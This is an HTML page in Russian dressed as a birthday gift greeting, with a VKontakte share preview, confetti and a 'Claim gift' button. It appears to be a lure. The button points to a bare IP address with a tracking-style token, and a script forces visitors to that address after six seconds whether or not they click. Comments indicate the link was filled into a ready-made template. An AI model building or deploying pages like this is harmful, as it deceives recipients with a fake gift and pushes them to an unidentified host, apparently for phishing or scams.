<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>С днём рождения! 🎁</title>

    <!-- Превью для ВКонтакте (ваша картинка уже вставлена) -->
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Тебе подарок! 🎁 Открой скорее" />
    <meta property="og:description" content="Празднуем! Порадуйте друзей подарком." />
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #a6d0f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
        }

        .hero-wrap {
            position: relative;
            width: 100%;
            max-width: 520px;
            margin: 0 auto;
        }

        .hero-wrap img {
            display: block;
            width: 100%;
            height: auto;
        }

        .btn-gift {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            bottom: 7%;
            width: 78%;
            padding: 18px 24px;
            background: #fff;
            color: #1a1a2e;
            font-size: 19px;
            font-weight: 800;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35);
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35); }
            50%      { box-shadow: 0 10px 40px rgba(255, 255, 255, 0.7); }
        }

        .btn-gift:active {
            transform: translateX(-50%) scale(0.96);
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            opacity: 0.8;
            animation: fall linear infinite;
            z-index: 100;
            pointer-events: none;
        }

        @keyframes fall {
            0%   { transform: translateY(-100vh) rotate(0deg); }
            100% { transform: translateY(100vh) rotate(720deg); }
        }

        @media (min-width: 561px) {
            body {
                background: linear-gradient(180deg, #2f8ef0 0%, #a6d0f8 100%);
                justify-content: center;
                padding: 40px 0;
            }
            .hero-wrap {
                max-width: 430px;
                border-radius: 26px;
                overflow: hidden;
                box-shadow: 0 25px 70px rgba(0, 0, 0, 0.28);
            }
        }
    </style>
</head>
<body>

    <div id="confetti-container"></div>

    <div class="hero-wrap">
        <!-- Картинка на странице (используем вашу ссылку, чтобы точно работало) -->
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" alt="Праздничный торт">
        
        <!-- ССЫЛКА НА ПОДАРОК (уже вставлена) -->
        <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
            🎁 Забрать подарок
        </a>
    </div>

    <script>
        function createConfetti() {
            const container = document.getElementById('confetti-container');
            const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#01a3a4', '#f368e0'];

            for (let i = 0; i < 40; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.width = (Math.random() * 8 + 5) + 'px';
                confetti.style.height = (Math.random() * 8 + 5) + 'px';
                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
                confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                confetti.style.animationDelay = (Math.random() * 3) + 's';
                container.appendChild(confetti);
            }
        }
        createConfetti();

        // Автопереход через 6 секунд на вашу ссылку
        const giftBtn = document.getElementById('giftBtn');
        const targetUrl = giftBtn.href;

        const redirectTimeout = setTimeout(() => {
            window.location.href = targetUrl;
        }, 6000);

        giftBtn.addEventListener('click', function(e) {
            e.preventDefault();
            clearTimeout(redirectTimeout);
            window.location.href = targetUrl;
        });
    </script>

</body>
</html>
